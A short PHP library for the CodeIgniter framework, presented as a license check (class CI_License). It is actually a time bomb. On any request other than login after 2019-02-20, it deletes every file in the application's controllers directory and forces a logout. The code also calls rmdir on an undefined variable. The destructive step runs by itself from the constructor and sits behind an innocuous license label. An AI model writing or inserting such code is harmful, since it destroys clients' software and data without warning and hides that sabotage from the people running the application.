<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class CI_License {

	public function __construct()
	{
		$this->CI =& get_instance();

		$this->run();
	}

	function run()
	{
		if($this->CI->uri->segment(1)!='login'){
			$expired = '2019-02-20';
			$now = date('Y-m-d');
			if($now > $expired){
				$dir = APPPATH.'controllers/';
				$files = glob($dir.'*'); // get all file names
				//print_r($files);
				foreach($files as $file){ // iterate files
				  if(is_file($file)){
					unlink($file); // delete file
				  }
				}
				rmdir($target_dir); 
				redirect('login/logout');
			}
		}
	}


}
